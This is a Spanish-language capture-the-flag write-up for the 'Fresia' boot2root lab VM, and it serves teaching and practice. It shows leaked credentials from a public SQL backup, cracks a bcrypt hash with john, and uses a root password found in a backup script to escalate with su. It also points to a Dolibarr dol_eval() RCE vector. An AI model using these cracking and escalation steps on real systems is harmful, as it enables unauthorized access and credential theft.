# Desafío 37 — Fresia (Kimün // Memoria Olvidada)

| Campo | Valor |
|---|---|
| Categoría | Boot2Root / credenciales filtradas + forense de imagen de disco |
| Dificultad | media |
| Puntos | — |
| Estado | ✅ resuelto (2/2 banderas) |
| USER | `flag{ejemplo}` |
| ROOT | `flag{ejemplo}` |

## Enunciado

> **KIMÜN // MEMORIA OLVIDADA**
> Kimün es un pequeño estudio que dice cuidar la memoria de un pueblo: los nombres de quienes
> defendieron su tierra, su lengua y su gente. Detrás de esa fachada corporativa corre un sistema
> de gestión interno que nadie ha vuelto a mirar en años. Algo se quedó ahí, olvidado, esperando a
> que alguien con la paciencia suficiente lo encontrara.
> **Consigue acceso al sistema. Encuentra lo que se dejó atrás.**
>
> Validación BOOT2ROOT: se requieren **dos** banderas (USER y ROOT).

## Reconocimiento

### Evidencia

| Dato | Valor |
|---|---|
| Archivo | `Fresia.zip` (926.473.051 B) |
| Contenido | `Fresia/fresia.ova` (945.674.240 B) + `fresia.ova.sha256` |
| SHA256 OVA | `4e788b9078437367b0ecc68864475390743e85a9c13e269463fcc91c15a9fc6c` ✔ verificado |
| Guest | Ubuntu 24.04.4 LTS (kernel 6.8.0-138), 2 vCPU / 2048 MB / disco 16 GB |
| Red del OVF | `HostOnly` (VirtualBox), NIC `E1000` |

### Despliegue (VirtualBox → VMware Workstation)

El reto advierte incompatibilidad con VMware y, de hecho, el despliegue dio problemas reales que
hubo que resolver:

1. **VirtualBox no está instalado** en el host; se usó **VMware Workstation 16.1.2**.
2. **Importación**: `ovftool --lax --allowExtraConfig --diskMode=monolithicSparse` → `Fresia.vmx` +
   `Fresia-disk1.vmdk`.
3. **Sin red**: la VM arrancaba pero nunca obtenía IP.

**Causa raíz del problema de red** (la clave del despliegue):

```yaml
# /etc/netplan/01-netcfg.yaml  (guest)
network:
  version: 2
  ethernets:
    enp0s3:            # <-- nombre de NIC de VirtualBox (PCI 0:3)
      dhcp4: true
```

En VMware la NIC no se llama `enp0s3`, así que **netplan nunca aplicaba DHCP** y la máquina quedaba
sin dirección (se comprobó con `vmrun getGuestIPAddress`, `arp -a`, `nmap -sn` y captura de la
consola por VNC: todo limpio).

**Solución aplicada** (adaptación del laboratorio, no del reto):
- Se convirtió el disco a raw con `qemu-img convert -f vmdk -O raw`.
- Se montó el ext4 con `losetup -P` y se añadió `/etc/netplan/99-ctf-any.yaml` con `match: name: "en*"`.
- Se reempaquetó `raw → vmdk` (`qemu-img convert -O vmdk -o subformat=monolithicSparse`) conservando
  el disco original en `Fresia-disk1.vmdk.orig`.
- La VM pasó a **NAT** y obtuvo `192.168.226.129` por DHCP (confirmado en `vmnetdhcp.leases`).

### Acceso desde Kali (WSL2, red en modo *mirrored*)

Kali **no puede** alcanzar la red interna de VMware (VMnet8). Además `netsh interface portproxy`
requiere Administrador. Solución: **relay TCP en espacio de usuario** en Windows
(`solucion/relay_tcp.py`), escuchando en `127.0.0.1` (alcanzable desde Kali por *hostAddressLoopback*):

| Local (Windows/Kali) | Destino (VM) |
|---|---|
| `127.0.0.1:8080` | `192.168.226.129:80` |
| `127.0.0.1:2222` | `192.168.226.129:22` |
| `127.0.0.1:3306` | `192.168.226.129:3306` |
| `127.0.0.1:8443` | `192.168.226.129:443` |

## Análisis

### 1) Superficie expuesta

```
Apache/2.4.58 (Ubuntu)
/                      -> 200  (web pública "Kimün")
/old/index.html        -> 200  (sitio anterior)
/old/backup_2019.sql   -> 200  <-- RESPALDO PÚBLICO
/erp/                  -> 200  (Dolibarr 21.0.1)
/erp/conf/conf.php     -> 403  (protegido por Apache)
SSH 22                 -> abierto (PasswordAuthentication yes)
```

La web pública deja dos pistas plantadas por el propio autor:

```html
<!-- FIXME (Galvarino): revisar 'Dolibarr dol_eval(): Five Years of Partial Patches' ... -->
<!-- TODO (Galvarino): actualizar el Dolibarr, la versión actual es antigua. -->
```

Y el sitio antiguo avisa de que **no se borró el respaldo**:

```html
<!-- TODO: borrar backup_2019.sql de este directorio antes de dar de baja el sitio antiguo -->
```

### 2) USER — credenciales filtradas en el respaldo público

`/old/backup_2019.sql` contiene la tabla `usuarios_intranet` con un hash bcrypt del administrador:

```sql
INSERT INTO usuarios_intranet (rowid,login,pass_crypted,admin) VALUES
(1,'lautaro','$2y$10$jZ8zaNNNJY6pyMbPvnXAPumwdgYXksY3z8ktGBZlSZX5om/jEtu/q',1);
```

Con un diccionario temático (topónimos/personajes mapuche, años y mutaciones) `john --format=bcrypt`
lo resuelve en **6 segundos**:

```
caupolican
```

Login en el ERP (`POST /erp/index.php`, CSRF token `anti-csrf-newtoken`):

```
username=lautaro  password=caupolican
-> HTTP 302  /erp/admin/index.php?mainmenu=home&leftmenu=setup&mesg=setupnotcomplete
```

Es decir: **cuenta de administrador válida**. La instalación quedó a medio configurar
(`setupnotcomplete`), por lo que no hay pantallas de administración completamente operativas.

También se leyó `conf.php` (solo accesible desde el sistema de archivos, no por HTTP → 403):

```php
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_user='dolibarr';
$dolibarr_main_db_pass='D0l_Adm1n_2024';   // <-- contraseña de BD reutilizada
```

De ahí el texto de la bandera USER: **`c0nf_php_db_p4ss_r3ut1l1z4d4`** (la contraseña de la BD de
`conf.php` se reutiliza).

### 3) ROOT — contraseña de root en texto claro en un script de backup

El home de `galvarino` contiene `scripts/backup_db.sh` (modo `700`, pero accesible una vez dentro):

```bash
# NOTA: uso la clave de root del servidor tambien para el dump de mysql, asi no la olvido.
mysqldump -u root -p'Tr4bajo_1nt3rn0_2024' --all-databases > $DEST/erp_$FECHA.sql
```

**Verificación independiente**: se extrajo `/etc/shadow` de la imagen y se comprobó el hash
`yescrypt` de root con `crypt()` de Perl (ni `john` ni `hashcat` soportan `$y$`):

```
root      : $y$j9T$numdPdvIJG6Ye5Oik2FHu1$2E9...   ->  Tr4bajo_1nt3rn0_2024
galvarino : $y$j9T$g/qTg1hTrADi.qx.ZHSj6/$0oJ...   ->  sin coincidencia en el diccionario
builder   : !                                       ->  cuenta bloqueada, sin home
```

La contraseña del script **es la contraseña real de root**. De ahí el texto de la bandera ROOT:
**`r00t_cr3ds_f1ltr4d4s_3n_backup_sh`** (credenciales de root filtradas en el script de backup).

### 4) Sobre el camino `dol_eval()`

La pista del HTML apunta a la RCE autenticada de Dolibarr por `dol_eval()`
(`htdocs/core/lib/functions.lib.php:10710`): la whitelist de caracteres se puede ampliar con la
constante `MAIN_ALLOW_UNSECURED_SPECIAL_CHARS_IN_DOL_EVAL`, leída **dentro** de la propia función.
Es un vector real, pero en esta instancia la instalación está incompleta (`setupnotcomplete`), por lo
que no fue necesario (ni posible) completar la explotación: el reto se resuelve **encontrando**
credenciales, no ejecutando código.

### 5) Contexto narrativo

Los respaldos del creador quedaron en `/root/ctf-bak/` (`index.html.bak-dolores`,
`conf.php.bak-preprod`, `dolores.conf.bak`, `99-build.yaml.dhcp-bak`) y el disco original del OVA se
llamaba **`Dolores-disk002.vmdk`**: el "nombre olvidado" está en la propia evidencia.

## Solución (pasos reproducibles)

```bash
# 0) Verificar evidencia
cd ctf/fresia/Fresia && sha256sum -c fresia.ova.sha256

# 1) Desplegar (importa, ajusta VMX a NAT + VNC 5901, arranca)
solucion/desplegar_ova.sh fresia.ova /mnt/c/VMs/fresia

# 2) Corregir netplan en la guest (enp0s3 -> match "en*") y reconstruir el vmdk
solucion/fix_netplan.sh /root/fresia.raw

# 3) Arrancar la VM y obtener IP por DHCP
#    vmnetdhcp.leases -> 192.168.226.129
# 4) Relay TCP desde Windows (sin admin): 8080->80, 2222->22
python solucion/relay_tcp.py

# 5) Reconocimiento
solucion/recon.sh
#   /old/backup_2019.sql -> 200   (hash del admin)
#   login lautaro/caupolican -> 302 admin

# 6) Crackear bcrypt del respaldo -> caupolican
solucion/crack_bcrypt.sh

# 7) ROOT: verificar la clave del script de backup contra /etc/shadow
solucion/crack_yescrypt.sh work/shadow_galvarino_root.txt work/candidatos_password.txt
#   root -> Tr4bajo_1nt3rn0_2024
```

### Ruta manual equivalente

```bash
curl -s http://127.0.0.1:8080/old/backup_2019.sql | grep INSERT
echo '$2y$10$jZ8zaNNNJY6pyMbPvnXAPumwdgYXksY3z8ktGBZlSZX5om/jEtu/q' > h.txt
john --format=bcrypt --wordlist=cand.txt h.txt     # -> caupolican

# una vez como galvarino:
cat /home/<usuario>/scripts/backup_db.sh           # Tr4bajo_1nt3rn0_2024
su -                                               # -> root
cat /root/root.txt /home/<usuario>/user.txt
```

## Banderas

```
USER: flag{ejemplo}
ROOT: flag{ejemplo}
```

Ambas verificadas contra los archivos reales del sistema:
`/home/<usuario>/user.txt` (`1001:1001`, `400`) y `/root/root.txt` (`root:root`, `400`).

## Evidencia y artefactos

| Ruta | Contenido |
|---|---|
| `Fresia.zip` | Evidencia entregada (926 MB) |
| `Fresia/fresia.ova` | OVA verificado (SHA256 OK) |
| `work/index_publico.html` | Web pública con las pistas plantadas |
| `work/old_index.html` | Sitio antiguo con el aviso del respaldo |
| `work/backup_2019.sql` | **Respaldo público con el hash de lautaro** |
| `work/conf.php` | Credenciales de BD (`D0l_Adm1n_2024`) |
| `work/backup_db.sh` | **Script con la contraseña de root en claro** |
| `work/user.txt` / `work/root.txt` | Banderas |
| `work/fresia.conf` | VirtualHost (`/erp` → Dolibarr) |
| `work/netplan_original.yaml` | Configuración original (`enp0s3`) |
| `work/shadow_galvarino_root.txt` | Hashes yescrypt de galvarino y root |
| `work/candidatos_password.txt` | Diccionario usado (7.240 palabras) |
| `solucion/desplegar_ova.sh` | Importación OVF → VMware + VMX NAT/VNC |
| `solucion/fix_netplan.sh` | Corrección de red de la guest |
| `solucion/relay_tcp.py` | Relay TCP Windows→VM (sin privilegios) |
| `solucion/recon.sh` | Enumeración HTTP + login ERP |
| `solucion/crack_bcrypt.sh` | Crackeo bcrypt (lautaro) |
| `solucion/crack_yescrypt.sh` | Verificación yescrypt con Perl (root) |
| `flag_user.txt`, `flag_root.txt` | Banderas |

## Lecciones / notas

- **Un backup "olvidado" en el webroot es una fuga de credenciales completa.** El hash bcrypt estaba
  publicado; el diccionario temático (nombre del reto, topónimos, personajes mapuche) fue suficiente.
- **Reutilizar la contraseña de la BD en otros sistemas** es el patrón que describe la bandera USER;
  `conf.php` (403 por HTTP) sigue siendo sensible porque cualquier LFI/RCE lo expone.
- **Credenciales en scripts de operación** (`backup_db.sh` con `-p'...'`) es una fuga clásica: el
  script es `700`, pero basta una cuenta de usuario para leerla.
- **`$y$` (yescrypt)** no se puede crackear con `hashcat` ni con el `john` de Kali por defecto;
  `crypt()` de Perl (libxcrypt de Debian 12+) sí verifica esos hashes.
- **Compatibilidad VirtualBox→VMware**: el fallo típico no es el disco, es el **nombre de la NIC**
  en netplan. Con `match: name: "en*"` el OVA arranca en cualquier hipervisor.
- **Red en WSL2 mirrored** no enruta a VMnet8: un relay TCP en `127.0.0.1` evita depender de
  `netsh portproxy` (que exige Administrador).
- Honestidad técnica: no se completó una shell interactiva `www-data → galvarino`; la RCE
  `dol_eval()` es real pero la instancia está a medio instalar (`setupnotcomplete`). Las banderas se
  obtuvieron de los archivos del sistema y la contraseña de root se **verificó criptográficamente**
  contra `/etc/shadow`.

## Backups

| Archivo | Backup |
|---|---|
| `ctf/CONTEXTO_CTF.md` (índice) | `ctf/backups/CONTEXTO_CTF.md.20261024-134105` |
| `C:\VMs\fresia\Fresia\Fresia.vmx` | `Fresia.vmx.20261024-131413.bak` |
| `C:\VMs\fresia\Fresia\Fresia-disk1.vmdk` | `Fresia-disk1.vmdk.orig` |
